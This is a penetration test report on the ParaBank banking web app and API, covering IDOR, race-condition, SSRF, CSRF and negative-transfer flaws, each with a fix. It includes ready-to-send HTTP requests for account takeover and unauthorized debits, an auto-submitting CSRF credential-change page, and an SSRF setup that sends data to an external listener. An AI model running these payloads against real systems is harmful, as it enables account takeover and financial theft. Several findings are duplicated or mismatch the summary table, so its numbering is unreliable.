# Vulnerability Assessment & Penetration Testing Report

**Target System:** ParaBank Web & REST API Architecture

**Assessment Type:** Black-Box Web Application Penetration Test

**Methodology:** OWASP Top 10 (2021) / OWASP WSTG v4.2 / PTES

**Lead Penetration Tester:** Sai Kapindra

**Date:** November 2026

**Document Classification:** Confidential / Sanitized Public Security Audit

---

## 1. Executive Summary

During November 2026, an independent black-box web application penetration test was conducted against the **ParaBank** banking application (`[https://parabank.parasoft.com](https://parabank.parasoft.com)` / `[http://parabank.local:8081](http://parabank.local:8081)`). The primary objective was to assess the security posture of the platform, evaluate tenant isolation, test business logic workflows, and identify exploitable vulnerabilities across authentication, authorization, and core transaction mechanisms.

### 1.1 Assessment Highlights & High-Level Posture

The assessment revealed critical systemic vulnerabilities across object-level access controls, concurrency handling, and backend service integrations:

* **Tenant Isolation Failure:** Multiple high-severity Insecure Direct Object Reference (IDOR / BOLA) vulnerabilities allow authenticated attackers to access sensitive Personally Identifiable Information (PII), expose user Social Security Numbers (SSN), manipulate other customers' accounts, and execute complete account takeover (ATO).
* **Financial Integrity Violation:** A Time-of-Check to Time-of-Use (TOCTOU) race condition in the funds transfer workflow permits double-spending and arbitrary account balance inflation.
* **Server-Side Request Forgery:** An administrative service integration feature permits outbound Server-Side Request Forgery (SSRF), exposing internal application data and creating severe lateral movement risk.

---

## 2. Scope & Target Information

| Scope Parameter | Details |
| --- | --- |
| **Primary Domain / Base URL** | `[https://parabank.parasoft.com](https://parabank.parasoft.com)` |
| **Local Staging Environment** | `[http://parabank.local:8081](http://parabank.local:8081)` |
| **Assessment Approach** | Black-Box / Authenticated Web Application & REST API |
| **Testing Standards** | OWASP Web Security Testing Guide (WSTG v4.2), PTES |
| **Primary Tools Utilized** | Burp Suite Professional, OWASP ZAP, Nmap, Python 3, Webhook Out-of-Band Listener |

---

## 3. Vulnerability Summary Matrix

| ID | Vulnerability Title | Severity | CVSS v3.1 Base Score | CVSS Vector String |
| --- | --- | --- | --- | --- |
| **SEC-01** | IDOR Leading to Full Account Takeover | **Critical** | **9.8** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **SEC-02** | Race Condition (TOCTOU) Allowing Double Spending | **Critical** | **9.1** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:H` |
| **SEC-03** | Server-Side Request Forgery (SSRF) in Loan Processor | **Critical** | **9.1** | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N` |
| **SEC-04** | IDOR – Customer PII & SSN Disclosure | **High** | **7.5** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **SEC-05** | IDOR – Unauthorized Account Balance & Activity Disclosure | **High** | **7.5** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **SEC-06** | IDOR – Unauthorized Third-Party Bill Payment Funding | **High** | **8.1** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H` |
| **SEC-07** | IDOR – Loan Down Payment Funded via Victim Account | **High** | **8.1** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H` |
| **SEC-08** | Cross-Site Request Forgery (CSRF) Profile Modification | **High** | **8.8** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` |
| **SEC-09** | Business Logic Flaw – Negative Fund Transfer Inflation | **High** | **7.1** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L` |

---

## 4. Detailed Technical Findings

---

### SEC-01: Insecure Direct Object Reference (IDOR) Leading to Full Account Takeover

* **Severity:** Critical (CVSS:3.1: **9.8**)
* **Vulnerability Class:** CWE-284 (Improper Access Control) / CWE-639 (Authorization Bypass Through User-Controlled Key)
* **Affected Endpoint:** `POST /parabank/services_proxy/bank/customers/update/{customerId}`

#### Vulnerability Description

The customer profile modification endpoint relies entirely on an untrusted path variable (`customerId`) without verifying whether the requested customer ID matches the currently authenticated session user. An attacker can overwrite any profile in the database, including the victim's username and password, directly leading to complete account takeover.

#### Proof of Concept (PoC)

<img width="1906" height="882" alt="Screenshot 2026-08-09 234122" src="https://github.com/user-attachments/assets/f3f275fa-26e0-402e-91c6-72d07b7a849d" />



1. Authenticate to the application with low-privilege credentials.
2. Issue a crafted HTTP `POST` request referencing target `customerId: 94907`:

```http
POST /parabank/services_proxy/bank/customers/update/94907 HTTP/1.1
Host: parabank.parasoft.com
Cookie: JSESSIONID=victim_or_attacker_session_cookie
Content-Type: application/x-www-form-urlencoded

firstName=Compromised&lastName=Account&street=123+Attacker+Way&city=Dallas&state=TX&zipCode=75001&phoneNumber=5550192834&ssn=000112222&username=hijackeduser&password=HackedPassword123!

```

3. The server responds with `HTTP 200 OK` (`Successfully updated customer profile`).
4. Authenticate using `hijackeduser:HackedPassword123!`. The attacker obtains unrestricted access to customer `94907`'s checking accounts, transaction history, and funds.

#### Business Impact

Complete loss of confidentiality, integrity, and availability for user accounts across the enterprise. Mass automated exploitation allows an attacker to seize all accounts in the database.

#### Remediation

* Discard client-supplied object identifiers in profile update endpoints. Extract the `customerId` strictly from the server-managed session context:

```java
// Secure Implementation Example (Spring Security)
@PostMapping("/customers/update")
public ResponseEntity<?> updateProfile(@AuthenticationPrincipal CustomUserDetails user, @RequestBody UpdateDTO dto) {
    customerService.updateProfile(user.getCustomerId(), dto);
    return ResponseEntity.ok("Profile updated successfully.");
}

```

---

### SEC-02: Race Condition (TOCTOU) Allowing Double Spending

* **Severity:** Critical (CVSS:3.1: **9.1**)
* **Vulnerability Class:** CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization)
* **Affected Endpoint:** `POST /parabank/services_proxy/bank/transfer`

#### Vulnerability Description

The funds transfer workflow suffers from a Time-of-Check to Time-of-Use (TOCTOU) race condition. The application queries the database to verify whether the source account holds sufficient funds, but fails to lock the record before executing the debit. By sending concurrent requests in parallel, an attacker can bypass the balance check multiple times simultaneously.

#### Proof of Concept (PoC)

<img width="1912" height="878" alt="Screenshot 2026-08-10 001130" src="https://github.com/user-attachments/assets/7f8c789d-2b63-45d3-b1c4-f89b572c1bda" />



<img width="1917" height="972" alt="Screenshot 2026-08-10 001154" src="https://github.com/user-attachments/assets/7b6082a5-f2bd-4b11-9caa-5eb9bf70c8f1" />



1. Establish two accounts: Account A ($100 balance) and Account B ($0 balance).
2. Intercept a transfer request moving $100 from Account A to Account B.
3. Configure Burp Suite Intruder / Turbo Intruder to dispatch 20 parallel HTTP requests within a single execution window using HTTP/2 multiplexing or TCP connection warming.
4. **Result:** All 20 requests succeed with `HTTP 200 OK`. Account A drops to an overdraft balance of `-$1,884.50`, while Account B receives `$2,400.00`, generating arbitrary balance out of thin air.

#### Remediation

Enforce ACID-compliant transactional isolation with pessimistic row-level locking at the database level:

```sql
-- Lock source account row during balance validation and transfer
SELECT balance FROM accounts WHERE account_id = :fromAccount FOR UPDATE;

```

---

### SEC-03: Server-Side Request Forgery (SSRF) in Loan Processor Service

* **Severity:** Critical (CVSS:3.1: **9.1**)
* **Vulnerability Class:** CWE-918 (Server-Side Request Forgery)
* **Affected Endpoints:** `POST /parabank/admin.htm` & `POST /parabank/requestloan.htm`

#### Vulnerability Description

The administrative configuration interface allows administrators to define a custom endpoint URL for the external SOAP Loan Processor Web Service. The application fails to restrict this URL to an allowlist of trusted corporate domains. When a standard loan request is processed, the backend server makes an outbound HTTP/SOAP request to the arbitrary destination.

#### Proof of Concept (PoC)

<img width="1916" height="827" alt="Screenshot 2026-08-10 002659" src="https://github.com/user-attachments/assets/8359f2b6-eeea-461d-9dbb-59b9b9dd4fdf" />


1. In the administrative panel, configure the Loan Processor Endpoint to an external listening listener (`[https://webhook.site/](https://webhook.site/)<unique_id>`).
2. Submit a loan request via `/parabank/requestloan.htm`.
3. The server dispatches an outbound HTTP request containing sensitive transaction metadata:

```xml
POST /<unique_id> HTTP/1.1
Host: webhook.site
Content-Type: text/xml; charset=utf-8

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <ns2:requestLoan xmlns:ns2="http://service.parabank.parasoft.com/">
      <requestDate>2026-11-06T10:14:00.000Z</requestDate>
      <customerId>12656</customerId>
      <availableFunds>815.50</availableFunds>
      <loanAmount>1000</loanAmount>
      <downPayment>100</downPayment>
    </ns2:requestLoan>
  </soap:Body>
</soap:Envelope>

```

#### Remediation

* Implement a strict server-side destination allowlist. Reject user-supplied or unapproved external URLs.
* Block requests destined for RFC 1918 private IP ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`) and cloud metadata services (`169.254.169.254`).

---


### SEC-04: Insecure Direct Object Reference (IDOR) Leading to Full Account Takeover

* **Severity:** Critical (CVSS:3.1: **9.8** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
* **Vulnerability Class:** CWE-639 (Authorization Bypass Through User-Controlled Key)
* **Affected Endpoint:** `POST /parabank/services_proxy/bank/customers/update/{customerId}`

#### Vulnerability Description

The profile update API endpoint fails to verify session-to-object ownership. An authenticated user can supply any arbitrary `customerId` in the URL path. By passing replacement values for `username` and `password` in the request body, an attacker can overwrite existing credentials for target accounts, leading directly to full account takeover.

#### Proof of Concept (PoC)


1. Authenticate with standard credentials and identify a target identifier (e.g., `customerId: 94907`).
2. Transmit an update request targeting the victim's identifier:

```http
POST /parabank/services_proxy/bank/customers/update/94907 HTTP/1.1
Host: parabank.parasoft.com
Cookie: JSESSIONID=[session_token]
Content-Type: application/x-www-form-urlencoded

firstName=Compromised&lastName=Account&street=123+Street&city=City&state=State&zipCode=10001&phoneNumber=5555555555&ssn=111223333&username=hackeduser&password=HackedPassword123!

```

3. The server responds with `HTTP 200 OK` (`Successfully updated customer profile`).
4. Re-authenticate using the modified credentials (`hackeduser` / `HackedPassword123!`) to access the victim's account.

#### Security Impact

Complete loss of confidentiality, integrity, and availability. An attacker can systematically overwrite credentials across all database IDs, resulting in widespread tenant compromise.

#### Remediation

Extract the active customer identifier strictly from the server-side session context rather than accepting it from path variables or user-controlled inputs:

```java
@PostMapping("/customers/update")
public ResponseEntity<?> updateProfile(
        @AuthenticationPrincipal CustomUserDetails user,
        @RequestBody UpdateProfileDTO dto) {
    
    customerService.updateProfile(user.getCustomerId(), dto);
    return ResponseEntity.ok("Profile updated successfully.");
}

```


### SEC-05: Insecure Direct Object Reference (IDOR) – Loan Down Payment Funded via Victim Account

* **Severity:** High (CVSS:3.1: **8.1** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H`)
* **Vulnerability Class:** CWE-284 (Improper Access Control)
* **Affected Endpoint:** `POST /parabank/services_proxy/bank/loans` (or `/parabank/requestloan.htm`)

#### Vulnerability Description

The loan application service allows an applicant to specify an arbitrary `accountId` to fund the required loan down payment. The backend processes the deduction without verifying whether the funding account belongs to the applicant.

#### Proof of Concept (PoC)

<img width="1458" height="933" alt="Screenshot 2026-08-10 231141" src="https://github.com/user-attachments/assets/02a558e6-ea73-4609-9f69-8b0e58cfee6d" />

<img width="1888" height="912" alt="Screenshot 2026-08-10 231158" src="https://github.com/user-attachments/assets/fcfbe8cb-2125-4f4b-93f1-ba2e28d824bc" />

<img width="1885" height="897" alt="Screenshot 2026-08-10 231228" src="https://github.com/user-attachments/assets/6101e098-358b-4a63-b90a-1e3580515054" />

1. Authenticate as User A (the applicant).
2. Initiate a loan request, specifying a third-party account identifier (belonging to User B) in the `fromAccountId` parameter:

```http
POST /parabank/services_proxy/bank/requestLoan?customerId=12656&amount=1000&downPayment=100&fromAccountId=14010 HTTP/1.1
Host: parabank.parasoft.com
Cookie: JSESSIONID=[user_a_session]

```

3. The transaction completes successfully.
4. The loan funds are disbursed to User A, while the down payment is deducted from User B's balance without authorization.

#### Security Impact

Direct financial loss for third-party account holders. An attacker can repeatedly take out loans while debiting down payments from arbitrary victim accounts.

#### Remediation

Validate account ownership on the server side before executing financial debits:

```java
@PostMapping("/requestLoan")
public ResponseEntity<?> requestLoan(
        @RequestParam Long fromAccountId,
        @RequestParam BigDecimal amount,
        @RequestParam BigDecimal downPayment,
        @AuthenticationPrincipal CustomUserDetails user) {

    Account account = accountService.findById(fromAccountId);
    if (!account.getCustomerId().equals(user.getCustomerId())) {
        return ResponseEntity.status(HttpStatus.FORBIDDEN)
                             .body(new ErrorResponse("Unauthorized funding source."));
    }

    loanService.processLoan(user.getCustomerId(), account, amount, downPayment);
    return ResponseEntity.ok("Loan processed.");
}

```


---



---

### SEC-06: Insecure Direct Object Reference (IDOR) – Unauthorized Bill Payment Funding

* **Severity:** High (CVSS:3.1: **8.1** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H`)
* **Vulnerability Class:** CWE-284 (Improper Access Control) / CWE-639 (Authorization Bypass Through User-Controlled Key)
* **Affected Host:** `[https://parabank.parasoft.com](https://parabank.parasoft.com)`
* **Affected Endpoint:** `POST /parabank/services_proxy/bank/billpay` (or `/parabank/billpay.htm`)

#### Vulnerability Description

The Bill Pay service allows an authenticated customer to schedule payments to third-party payees. When submitting payment requests, the client specifies a funding account ID (`accountId`) in the request payload. The server-side transaction processor executes the debit against the specified `accountId` without validating whether that funding account belongs to the authenticated customer session.

#### Proof of Concept (PoC)

<img width="1882" height="957" alt="Screenshot 2026-08-10 233247" src="https://github.com/user-attachments/assets/416d2dec-346a-48dd-bd9e-1afd0fae2e8e" />

<img width="1467" height="896" alt="Screenshot 2026-08-10 233311" src="https://github.com/user-attachments/assets/de1163b8-5d83-418a-943c-13bb86c20cfc" />



1. Authenticate to ParaBank as a standard user (User A).
2. Navigate to the Bill Pay module, populate the payee information, and intercept the request in Burp Suite.
3. In the request body, alter the `accountId` parameter to reference an arbitrary third-party account (User B, e.g., `14010`).
4. Submit the transaction payload:

```http
POST /parabank/services_proxy/bank/billpay HTTP/1.1
Host: parabank.parasoft.com
Cookie: JSESSIONID=[authenticated_user_session]
Content-Type: application/json
Accept: application/json

{
  "payeeName": "External Utility Corp",
  "amount": 100.00,
  "accountId": 14010
}

```

5. The backend returns `HTTP 200 OK` confirming payment execution.
6. Verification on User B's statement confirms the $100.00 balance deduction occurred without User B's authorization.

#### Business Impact

Direct financial theft. An attacker can systematically settle personal invoices, utility payments, or debts by charging arbitrary customer accounts across the platform.

#### Remediation

Implement explicit ownership validation in the bill payment controller. Ensure the source `accountId` belongs to the authenticated `customerId` retrieved from the secure session before debiting funds:

```java
@PostMapping("/billpay")
public ResponseEntity<?> processBillPay(
        @RequestBody BillPayRequest request,
        @AuthenticationPrincipal CustomUserDetails user) {

    Account sourceAccount = accountService.findById(request.getAccountId());

    // Validate account ownership against authenticated session principal
    if (!sourceAccount.getCustomerId().equals(user.getCustomerId())) {
        return ResponseEntity.status(HttpStatus.FORBIDDEN)
                             .body(new ErrorResponse("Unauthorized: Funding account does not belong to session user."));
    }

    billPayService.executePayment(sourceAccount, request);
    return ResponseEntity.ok(new BillPayResponse("Payment completed successfully."));
}

```

---

### SEC-07: Race Condition / Double Spending (Time-of-Check to Time-of-Use)

* **Severity:** Critical (CVSS:3.1: **9.1** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:H`)
* **Vulnerability Class:** CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization)
* **Affected Host:** `[https://parabank.parasoft.com](https://parabank.parasoft.com)` (or `[http://parabank.local:8081](http://parabank.local:8081)`)
* **Affected Endpoint:** `POST /parabank/services_proxy/bank/transfer` (or `/parabank/transfer.htm`)

#### Vulnerability Description

The funds transfer transaction logic is vulnerable to a Time-of-Check to Time-of-Use (TOCTOU) race condition. When a transfer is requested, the application checks whether the source account contains sufficient balance before initiating the debit and credit sequence. However, the system fails to apply database row-level locking or distributed synchronization locks during the transaction window. By issuing concurrent requests in parallel, an attacker can pass multiple balance checks simultaneously before the balance is debited.

#### Proof of Concept (PoC)

<img width="1858" height="866" alt="Screenshot 2026-08-15 152041" src="https://github.com/user-attachments/assets/53c1c370-746d-4b72-9cac-9aae0dc268a7" />

<img width="1911" height="970" alt="Screenshot 2026-08-15 152131" src="https://github.com/user-attachments/assets/d4227afd-cab6-4aff-8703-da352cc32af9" />


1. Authenticate with an account having a known limited balance (e.g., Account A with $100.00) and an auxiliary receiving account (Account B with $0.00).
2. Intercept a transfer request moving $100.00 from Account A to Account B.
3. Forward the request to an engine capable of concurrent execution (e.g., Burp Suite Intruder with connection pooling or Turbo Intruder using `race()`).
4. Dispatch 20 concurrent requests simultaneously across a parallel connection pool:

```http
POST /parabank/services_proxy/bank/transfer?fromAccountId=164415&toAccountId=165192&amount=100 HTTP/1.1
Host: parabank.parasoft.com
Cookie: JSESSIONID=[authenticated_user_session]
Content-Type: application/x-www-form-urlencoded

```

5. Observe that multiple parallel requests receive `HTTP 200 OK`.
6. Inspect the Accounts Overview: Account A displays a negative overdraft balance (e.g., `-$1,884.50`), while Account B receives the inflated sum (`+$2,400.00`).

#### Business Impact

Severe financial integrity compromise. Attackers can artificially multiply funds, bypass overdraft restrictions, and produce synthetic currency within the bank's ledger, leading to total operational and financial loss.

#### Remediation

* Enforce pessimistic row locking at the database level during fund balance checks and updates:

```sql
-- Lock the source account row during balance validation
SELECT balance FROM accounts WHERE account_id = :fromAccountId FOR UPDATE;

```

* Wrap the entire transfer routine inside an atomic, `@Transactional` isolation scope (using `SERIALIZABLE` or `REPEATABLE READ` isolation level):

```java
@Transactional(isolation = Isolation.SERIALIZABLE)
public synchronized void transferFunds(Long fromAccountId, Long toAccountId, BigDecimal amount) {
    Account source = accountRepository.findByIdForUpdate(fromAccountId);
    
    if (source.getBalance().compareTo(amount) < 0) {
        throw new InsufficientFundsException("Insufficient funds available.");
    }
    
    source.debit(amount);
    Account destination = accountRepository.findByIdForUpdate(toAccountId);
    destination.credit(amount);
    
    accountRepository.save(source);
    accountRepository.save(destination);
}

```

---

### SEC-08: Cross-Site Request Forgery (CSRF) Profile Modification

* **Severity:** High (CVSS:3.1: **8.8**)
* **Vulnerability Class:** CWE-352 (Cross-Site Request Forgery)
* **Affected Endpoint:** `POST /parabank/services_proxy/bank/customers/update/{id}`

#### Vulnerability Description

The profile update form fails to implement cryptographically secure anti-CSRF tokens (Synchronizer Token Pattern) and does not validate the `Origin` or `Referer` headers. An attacker can host an external exploit page that triggers an unauthorized credential change when visited by an authenticated victim.

#### Proof of Concept (PoC)

<img width="1917" height="587" alt="Screenshot 2026-08-17 232516" src="https://github.com/user-attachments/assets/a97020f9-d8d6-496e-b1b2-cf941ad2bea9" />

<img width="1910" height="899" alt="Screenshot 2026-08-17 233519" src="https://github.com/user-attachments/assets/7f792632-365f-42e5-8399-fd4362dac3cb" />


```html
<!DOCTYPE html>
<html>
  <body>
    <form id="csrfForm" action="http://parabank.local:8081/parabank/services_proxy/bank/customers/update/12656" method="POST">
      <input type="hidden" name="firstName" value="Attacker" />
      <input type="hidden" name="lastName" value="Exploit" />
      <input type="hidden" name="username" value="hacker" />
      <input type="hidden" name="password" value="hacker123" />
    </form>
    <script>
      document.getElementById('csrfForm').submit();
    </script>
  </body>
</html>


```

#### Remediation

* Implement Spring Security CSRF protection across all state-changing `POST`, `PUT`, and `DELETE` routes.
* Apply the `SameSite=Strict` or `SameSite=Lax` attribute to session cookies.

---


---

### SEC-09: Business Logic Flaw – Negative Transfer Balance Inflation

* **Severity:** High (CVSS:3.1: **7.1** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L`)
* **Vulnerability Class:** CWE-20 (Improper Input Validation) / CWE-840 (Business Logic Error)
* **Affected Endpoint:** `POST /parabank/transfer.htm`

#### Vulnerability Description

The funds transfer interface fails to enforce positive numerical values on the transfer amount field. Submitting a negative amount reverses the subtraction logic on the source balance:

$$\text{Source Balance} = \text{Current Balance} - (-\text{Amount}) = \text{Current Balance} + \text{Amount}$$

This allows an authenticated user to artificially inflate their source account balance on demand.

#### Proof of Concept (PoC)

<img width="1909" height="943" alt="Screenshot 2026-08-18 004844" src="https://github.com/user-attachments/assets/bfb4d2f3-604a-47bd-a458-350e7d08b3b4" />

<img width="1910" height="959" alt="Screenshot 2026-08-18 004910" src="https://github.com/user-attachments/assets/e07f4d04-64f3-40f7-8d2d-f3e0edb14e80" />


1. Authenticate to ParaBank and navigate to **Transfer Funds** (`/parabank/transfer.htm`).
2. Input a negative amount (`-5000`), choose a source account, and select any destination account.
3. Submit the transfer and intercept the HTTP request:

```http
POST /parabank/transfer.htm HTTP/1.1
Host: parabank.parasoft.com
Cookie: JSESSIONID=[session_token]
Content-Type: application/x-www-form-urlencoded

fromAccountId=164415&toAccountId=165192&amount=-5000

```

4. The server responds with `HTTP 200 OK`: `Successfully transferred $-5000...`
5. Navigate to **Accounts Overview** and observe that the source account balance increased by `$5,000.00`.

#### Security Impact

Circumvents financial validation controls, allowing arbitrary ledger balance generation that can be used to fund downstream actions like loans or bill payments.

#### Remediation

Enforce server-side boundary checks ensuring transfer values are strictly greater than zero:

```java
if (amount == null || amount.compareTo(BigDecimal.ZERO) <= 0) {
    throw new IllegalArgumentException("Transfer amount must be greater than zero.");
}

```

---

## 5. Strategic Recommendations

1. **Adopt Centralized Authorization:** Replace per-endpoint custom checks with an explicit server-side authorization layer that validates resource ownership against session tokens.
2. **Implement Database Locking:** Use strict transactional controls (`SELECT FOR UPDATE`) on all financial operations to eliminate race conditions.
3. **Network Boundary Enforcement:** Enforce strict outbound firewall rules and domain allowlists for all backend server integrations to prevent SSRF and metadata access.

---

